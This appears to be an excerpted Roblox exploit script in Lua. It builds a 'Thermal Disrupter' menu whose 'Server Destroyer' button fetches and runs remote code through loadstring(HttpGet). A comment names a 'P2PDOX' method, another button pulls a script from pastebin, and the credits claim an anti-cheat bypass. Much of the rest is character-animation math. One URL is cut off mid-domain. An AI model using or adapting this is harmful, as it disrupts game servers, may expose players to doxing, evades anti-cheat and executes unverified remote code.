...
local Window = Library.CreateLib("Thermal Disrupter", "GrapeTheme")


-- THERMAL WROTE THIS

local Tab = Window:NewTab("Server Destroyer")
local Section = Tab:NewSection("Server Destroyer V3")


Section:NewButton("Start", "THERMAL ON TOP!", function()
    loadstring(game:HttpGet("https://www.dulldomain."))()
	-- P2PDOX METHOD BY THERMAL
end)

Section:NewButton("Stop", "THERMAL ON TOP!", function()
...
while event:Wait() do
    ...
    elseif vel.Y < -2 then -- fall
		...
		elseif mode == "dance" then
             neck.C0 = neck.C0:Lerp(cf(-1, 4, 2) * euler(-1.5882496193148399 + 0.2617993877991494 * sin((sine + -30) * 0.025), 0.17453292519943295 * sin((sine + -10) * 0.05), -3.1590459461097367 + 0.17453292519943295 * sin((sine + 30) * 0.05)), 0.2) 
            rootJoint.C0 = rootJoint.C0:Lerp(cf(2 * sin(sine * 0.05), 4 + 4 * sin(sine * 0.05), 1 * sin(sine * 0.025)) * euler(-1.5882496193148399 + 0.17453292519943295 * sin((sine + -15) * 0.025), 0.17453292519943295 * sin(sine * 0.05), -3.1590459461097367 + 0.3490658503988659 * sin((sine + 15) * 0.05)), 0.2) 
            ...
            leftHip.C0 = leftHip.C0:Lerp(cf(-2, -4, 1) * euler(1.5707963267948966, -1.5882496193148399 + 0.2617993877991494 * sin((sine + -9) * 0.05), 1.5707963267948966 + 0.3490658503988659 * sin((sine + -12) * 0.025)), 0.2) 
            rightHip.C0 = rightHip.C0:Lerp(cf(2, -4, 1.5) * euler(1.5707963267948966, 1.5707963267948966 + 0.2617993877991494 * sin((sine + -9) * 0.05), -1.5707963267948966 + -0.3490658503988659 * sin((sine + -5) * 0.025)), 0.2) 
...
--[[MW_animator progress save: 0, 0, 0, 0.1, -91, 15, -30, 0.025, 1, 0, 0, 0.1, 0, 10, -10, 0.05, 0, 0, 0, 0.1, -181, 10, 30, 0.05, 0, 1, 30, 0.05, -91, 10, -15, 0.025, 5, 1, 0, 0.05, 0, 10, 0, 0.05, 0, 1, 0, 0.025, -181, 20, 15, 0.05, -1, 0, 0, 0.1, 90, -20, -30, 0.025, 0.5, 0, 0, 0.1, -91, 20, -10, 0.05, 0, 0, 0, 0.1, 90, 0, 30, 0, 1, 0, 0, 0.1, 90, -20, -30, 0.025, 0.5, 0, 0, 0.1, 90, 20, -20, 0.05, 0, 0, 0, 0.1, -90, 0, 0, 0.1, -1, 0, 0, 0.1, 90, 0, 0, 0.1, -1, 0, 0, 0.1, -91, 15, -7, 0.05, 0, 0, 0, 0.1, 90, 20, -10, 0.025, 1, 0, 0, 0.1, 90, 0, 0, 0.1, -1, 0, 0, 0.1, 90, 15, -10, 0.05, 0, 0, 0, 0.1, -90, -20, -5, 0.025]]
		elseif mode == "floss" then
           neck.C0 = neck.C0:Lerp(cf(2, 1, 2) * euler(-1.5882496193148399 + 0.2617993877991494 * sin((sine + -30) * 0.025), 0.17453292519943295 * sin((sine + -10) * 0.05), -3.1590459461097367 + 0.17453292519943295 * sin((sine + 30) * 0.05)), 0.2) 
            rootJoint.C0 = rootJoint.C0:Lerp(cf(1 * sin(sine * 0.05), 4 + 12 * sin(sine * 0.05), 1 * sin(sine * 0.025)) * euler(-1.5882496193148399 + 0.17453292519943295 * sin((sine + -15) * 0.025), 0.17453292519943295 * sin(sine * 0.05), -3.1590459461097367 + 0.3490658503988659 * sin((sine + 15) * 0.05)), 0.2) 
            leftShoulder.C0 = leftShoulder.C0:Lerp(cf(-1, 0.5, 0) * euler(1.5707963267948966 + -0.3490658503988659 * sin((sine + -30) * 0.025), -1.5882496193148399 + 0.3490658503988659 * sin((sine + -10) * 0.05), 1.5707963267948966), 0.2) 
            rightShoulder.C0 = rightShoulder.C0:Lerp(cf(1, 0.5, 0) * euler(1.5707963267948966 + -0.3490658503988659 * sin((sine + -30) * 0.025), 1.5707963267948966 + 0.3490658503988659 * sin((sine + -20) * 0.05), -1.5707963267948966), 0.2) 
            leftHip.C0 = leftHip.C0:Lerp(cf(-3, -2, 1) * euler(1.5707963267948966, -1.5882496193148399 + 0.2617993877991494 * sin((sine + -7) * 0.05), 1.5707963267948966 + 0.3490658503988659 * sin((sine + -10) * 0.025)), 0.2) 
            rightHip.C0 = rightHip.C0:Lerp(cf(3, -2, 1) * euler(1.5707963267948966, 1.5707963267948966 + 0.2617993877991494 * sin((sine + -10) * 0.05), -1.5707963267948966 + -0.3490658503988659 * sin((sine + -5) * 0.025)), 0.2) 
--[[MW_animator progress save: 0, 0, 0, 0.1, -91, 15, -30, 0.025, 1, 0, 0, 0.1, 0, 10, -10, 0.05, 0, 0, 0, 0.1, -181, 10, 30, 0.05, 0, 1, 30, 0.05, -91, 10, -15, 0.025, 5, 1, 0, 0.05, 0, 10, 0, 0.05, 0, 1, 0, 0.025, -181, 20, 15, 0.05, -1, 0, 0, 0.1, 90, -20, -30, 0.025, 0.5, 0, 0, 0.1, -91, 20, -10, 0.05, 0, 0, 0, 0.1, 90, 0, 30, 0, 1, 0, 0, 0.1, 90, -20, -30, 0.025, 0.5, 0, 0, 0.1, 90, 20, -20, 0.05, 0, 0, 0, 0.1, -90, 0, 0, 0.1, -1, 0, 0, 0.1, 90, 0, 0, 0.1, -1, 0, 0, 0.1, -91, 15, -7, 0.05, 0, 0, 0, 0.1, 90, 20, -10, 0.025, 1, 0, 0, 0.1, 90, 0, 0, 0.1, -1, 0, 0, 0.1, 90, 15, -10, 0.05, 0, 0, 0, 0.1, -90, -20, -5, 0.025]]
        end
    end
end
...
local Tab = Window:NewTab("Custom Animations")
local Section = Tab:NewSection("Customs")

Section:NewButton("Arrested Hero", "Keys: F, u, T, Y, L", function()
    loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
end)

Section:NewButton("Arrested Physco Hero", "Keys: F, u, T, Y, L", function()
    -- FE Nameless Animations V2 *R15* Script - 2022 (COPY THE SCRIPT!)
...
Section:NewLabel("Developer: Thermal#7311")
Section:NewLabel("Anti-Cheat-Bypass: Verbal")
